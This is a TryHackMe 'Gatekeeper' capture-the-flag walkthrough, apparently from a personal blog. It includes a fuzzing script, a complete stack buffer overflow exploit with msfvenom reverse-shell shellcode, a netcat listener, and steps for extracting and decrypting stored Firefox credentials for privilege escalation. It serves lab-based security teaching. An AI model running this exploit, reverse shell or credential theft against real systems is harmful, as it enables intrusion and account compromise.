---
title: Gatekeeper Writeup || Tryhackme
date: 2025-2-4 00:00:00 +0800
categories: [Tryhackme, Offensive Pentesting Path]
tags: [tryhackme, writeup, walkthrough, buffer, overflow, windows]
description: This is a Writeup for Gatekeeper Room Which is a part of the offensive pentesting path on Tryhackme
---

### Scanning

We will start with scanning our machine 

```
Host is up (0.076s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2025-01-01T00:30:52
|_Not valid after:  2025-07-03T00:30:52
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2025-01-02T00:41:25+00:00
|_ssl-date: 2025-01-02T00:41:30+00:00; -6m20s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
```

We will find that there is an smb server on our target so let's start with listing the shares in it

![img-description](/assets/img/GateKeeper_Listing.png)
_Listing Shares_

as we can see there is a share called users let's see what we can find inside it

![img-description](/assets/img/GateKeeper_app.png)
_Getting the app_

we have found that there is an application inside the share so let's put it inside immunity debugger to see what is this

### Exploiting the BOF

Open the application in the immunity debugger and start running it with the red run icon you will find that there is a cmd window saying **[+] Listening for connections.**

So let's connect to it and see what we will get (You can see from the scanning that there is a port wich seems to host a kind of chatting app so this will be our port that we will connect to)

```
nc (the ip of the device you have opened the app on) 31337
    Hello
    Hello Hello!!!
    Hellooooo
    Hello Hellooooo!!!
```
We will see that it is a simple application which take the thing you type and put it beside the hello from the program so let's start to check if there is any possibility for a buffer overflow here

#### Mona Configuration

Mona is a script that can be used to automate and speed up specific searches while developing exploits it works on immunity debugger, we need to Set a working folder with this command (run in the command input box at the bottom of the Immunity Debugger window)
```
!mona config -set workingfolder c:\mona\%p
```
This ensures that all Mona-generated outputs (like logs, patterns, and offsets) are saved in a dedicated directory.

#### Fuzzing

Starting by fuzzing our target using this script

```
#!/usr/bin/env python3

import socket
import time

# Set target details
ip = "192.168.1.20"  # Change this to match your target
port = 31337 

payload = "A" * 100  # Start with 100 bytes
increment = 100  # Increase size by 100 bytes each loop
timeout = 5  # Timeout for socket connection

while True:
    try:
        print(f"Fuzzing with {len(payload)} bytes")

        # Create a new socket connection for each attempt
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))

        # Send the payload and read the response
        s.sendall(payload.encode() + b"\n")
        response = s.recv(1024).decode(errors="ignore")
        print("Server Response:", response)

        # Close the connection
        s.close()

    except socket.error as e:
        print(f"Fuzzing crashed at {len(payload)} bytes: {e}")
        break  # Stop if a crash occurs

    # Increase payload size
    payload += "A" * increment
    time.sleep(1)  # Short delay before the next attempt
```
After running the script you will find that it crached at 200 bytes

![img-description](/assets/img/GateKeeper_Fuzz.png)
_Fuzzing_

#### Crash Replication & Controlling EIP

Now as we know when it crached let's start to gain access to our system we will start with this script:

```
import socket

ip = "192.168.1.20"
port = 31337

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Now Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

A cyclic pattern is a unique sequence of characters generated using pattern_create.rb. The goal is to identify the exact position in the input where the Extended Instruction Pointer (EIP) is overwritten.

**Ex:** If you send "AAAAA..." and the crash doesn’t tell you where in the payload EIP is overwritten, a cyclic pattern helps pinpoint the exact offset.

Put the output of the command in the payload string in our script, and go back to the immunity debugger reopen the application "Ctrl + F2" and then click the red icon again to run it and then run the script.

after succesfully doing the last step we need now to know the exact EIP offset that it crached on it so we will run this command

```
!mona findmsp -distance 600
```

![img-description](/assets/img/GateKeeper_EIP.png)
_EIP Offset_

And we will find that the exact offset is 146.

Now restart the appliaction in immunity debugger and run it again, then update the exploit script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB" and we will find that the EIP register is overwritten succesfully which means that we have the right value.

![img-description](/assets/img/GateKeeper_overwrite.png)
_EIP Overwrite_

#### Finding Bad Characters

We need to Identify bytes that cause issues during payload delivery and remove them from our payload.

Bad characters, like \x00 (null byte), can terminate strings prematurely or corrupt data, causing the payload to fail so we need to remove them.

Generate a bytearray from \x01 to \xff, excluding null bytes (\x00). This serves as our reference for comparison.

```
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your exploit script and set the payload variable to the string of bad chars the script generates, restart and run the appliaction again and then run the exploit script.

Now make a note of the address to which the ESP register points which is in my case **00C219E8**

```
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 00C219E8
```

A popup window should appear labelled "mona Memory comparison results". The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![img-description](/assets/img/Gatekeeper_Badchars.png)
_Bad Chars_

**Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.**

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. 

```
!mona bytearray -b "\x00\x0a"
```

Then update the payload variable in your script and remove the new badchars as well.

Restart gatekeeper.exe in Immunity and run the modified script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

![img-description](/assets/img/BOF_Unmodified.png)
_End of Bad Chars_

#### Finding a Jump Point

Now run the following command, making sure to update the -cpb option with all the badchars you identified (including \x00):

```
!mona jmp -r esp -cpb "\x00\x0a"
```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified.

![img-description](/assets/img/GateKeeper_jmp.png)
_JMP ESP_

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

#### Generate Payload

Run the following msfvenom command on Kali for making the reverse shell payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 EXITFUNC=thread -b "\x00\x0a" -f c
```

Copy the generated C code strings and put them into your exploit script payload variable.

#### Prepend NOPs

Encoders used in msfvenom may require additional space in memory for the payload to decode and execute so we can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```

#### Exploit

Now our exploit script should be something like this

```
import socket

ip = "192.168.1.20"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = (""\xbd\x71\x1f\x93\xc1\xd9\xc7\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x68\x12\x83\xc0\x04\x03\x19\x11\x71\x34\x25"
"\xc5\xf7\xb7\xd5\x16\x98\x3e\x30\x27\x98\x25\x31\x18\x28"
"\x2d\x17\x95\xc3\x63\x83\x2e\xa1\xab\xa4\x87\x0c\x8a\x8b"
"\x18\x3c\xee\x8a\x9a\x3f\x23\x6c\xa2\x8f\x36\x6d\xe3\xf2"
"\xbb\x3f\xbc\x79\x69\xaf\xc9\x34\xb2\x44\x81\xd9\xb2\xb9"
"\x52\xdb\x93\x6c\xe8\x82\x33\x8f\x3d\xbf\x7d\x97\x22\xfa"
"\x34\x2c\x90\x70\xc7\xe4\xe8\x79\x64\xc9\xc4\x8b\x74\x0e"
"\xe2\x73\x03\x66\x10\x09\x14\xbd\x6a\xd5\x91\x25\xcc\x9e"
"\x02\x81\xec\x73\xd4\x42\xe2\x38\x92\x0c\xe7\xbf\x77\x27"
"\x13\x4b\x76\xe7\x95\x0f\x5d\x23\xfd\xd4\xfc\x72\x5b\xba"
"\x01\x64\x04\x63\xa4\xef\xa9\x70\xd5\xb2\xa5\xb5\xd4\x4c"
"\x36\xd2\x6f\x3f\x04\x7d\xc4\xd7\x24\xf6\xc2\x20\x4a\x2d"
"\xb2\xbe\xb5\xce\xc3\x97\x71\x9a\x93\x8f\x50\xa3\x7f\x4f"
"\x5c\x76\x2f\x1f\xf2\x29\x90\xcf\xb2\x99\x78\x05\x3d\xc5"
"\x99\x26\x97\x6e\x33\xdd\x70\x9b\xd1\xb4\xee\xf3\xdb\x46"
"\xeb\xd1\x55\xa0\x99\xc5\x33\x7b\x36\x7f\x1e\xf7\xa7\x80"
"\xb4\x72\xe7\x0b\x3b\x83\xa6\xfb\x36\x97\x5f\x0c\x0d\xc5"
"\xf6\x13\xbb\x61\x94\x86\x20\x71\xd3\xba\xfe\x26\xb4\x0d"
"\xf7\xa2\x28\x37\xa1\xd0\xb0\xa1\x8a\x50\x6f\x12\x14\x59"
"\xe2\x2e\x32\x49\x3a\xae\x7e\x3d\x92\xf9\x28\xeb\x54\x50"
"\x9b\x45\x0f\x0f\x75\x01\xd6\x63\x46\x57\xd7\xa9\x30\xb7"
"\x66\x04\x05\xc8\x47\xc0\x81\xb1\xb5\x70\x6d\x68\x7e\x90"
"\x8c\xb8\x8b\x39\x09\x29\x36\x24\xaa\x84\x75\x51\x29\x2c"
"\x06\xa6\x31\x45\x03\xe2\xf5\xb6\x79\x7b\x90\xb8\x2e\x7c"
"\xb1")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

If you are sure that everything is right you can now start a nc listener on your kali to get the connection

```
nc -nlvp 4444
```

reopen the application and click the red icon again to run it and then run the exploit script and wait for the connection
and you will find that we have recieved back a connection and now we are in the system.

### Initial Access

Now we know everything works perfectly let's now connect to the machine just change the ip in the script to connect to the thm machine instead of your local machine 

![img-description](/assets/img/GateKeeper_user.png)
_User access_

after running the script you will find that you have now access to the machine and here is our user flag

```
{H4lf_W4*******}
```

### Privilege Escalation

After getting the user flag you will find that on the desktop there is a file called **Firefox.lnk** which indicates that firefox browser is installed on the system.

![img-description](/assets/img/GateKeeper_firefox.png)
_Firefox_

So after some searching i have found that we can use metasploit to extract credintials from firefox using this module **multi/gather/firefox_creds** so let's do it provide the module with the session number and run it.

![img-description](/assets/img/GateKeeper_creds.png)
_Credentials_

Now we have some data that may have something interesting but it is encrypted so we need to decrypt it, searching for **how to decrypt firefox creds** you will find that there is a github repo for this called [firefox_decrypt](https://github.com/unode/firefox_decrypt) let's download it and start using it.

```
wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
```

and we got a hit it we will find that the script got the mayor creds for us

![img-description](/assets/img/GateKeeper_mayor.png)
_Mayor password_

Now connect to the machine with this creds with either rdp or smb and get the root flag

```
{Th3_M4y0r_***************}
```